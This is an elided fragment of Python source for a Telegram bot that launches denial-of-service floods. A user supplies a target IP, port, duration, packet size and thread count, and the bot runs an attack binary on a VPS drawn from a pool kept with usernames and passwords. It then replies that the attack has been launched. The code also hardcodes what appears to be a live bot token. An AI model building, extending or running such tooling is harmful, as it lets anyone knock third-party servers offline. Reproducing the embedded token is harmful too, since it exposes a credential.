...
TELEGRAM_BOT_TOKEN = '7512696530:AAGN9HUmJTGkKFOUN4mKPLU3rSF-HrUmRm8'
...
DEFAULT_THREADS = 500  # Default thread count for regular attack
DEFAULT_packetsize = 9
...
async def attack_input(update: Update, context: CallbackContext):
    ...
    if len(args) != 5:
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        await update.message.reply_text(
            f"❌ *Invalid input! Please enter: <ip> <port> <duration> <packetsize> <threads>*
"
            f"Example: `1.1.1.1 80 60 1200 500`
...
"
    ...
    ip, port, duration, packetsize, threads = args
    ...
    try:
        ...
        await update.message.reply_text("❌ All values must be valid numbers!")
        return ConversationHandler.END

    if not (20 <= packetsize <= 65000):
        await update.message.reply_text("❌ Packetsize must be between 20 and 65000.")
        return ConversationHandler.END
    ...
    if not available_vps:
        await update.message.reply_text("❌ No VPS available to launch attack at this moment.")
        return ConversationHandler.END

    selected_vps = available_vps[0]
    ip_vps, username, password = selected_vps

    command = f"./{BINARY_NAME} {ip} {port} {duration} {packetsize} {threads}"
    ...
    try:
        ...
        await update.message.reply_text(
            f"✅ Attack launched on `{ip}:{port}` for {duration}s with packetsize `{packetsize}` and threads `{threads}`!",
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to launch attack: {str(e)}")
